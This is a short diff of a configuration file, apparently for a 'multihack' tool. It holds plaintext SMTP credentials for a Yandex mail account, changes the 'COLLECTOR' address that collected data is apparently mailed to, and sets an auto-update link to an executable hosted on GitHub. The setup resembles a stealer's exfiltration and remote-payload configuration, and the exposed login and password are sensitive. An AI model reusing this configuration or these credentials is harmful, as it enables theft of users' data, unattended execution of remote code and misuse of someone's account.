@@ -3,7 +3,7 @@ HOST=smtp.yandex.ru
 LOGIN=multihack.update@yandex.ru
 PASSWORD=multihackupdate
 PORT=465
-COLLECTOR=multihack.update@yandex.ru
+COLLECTOR=chijikson@yandex.ru
 [UPDATE]
 LINK=https://github.com/ZongerX/test/raw/master/RuntimeUpdater.exe
 LASTVERSION=1
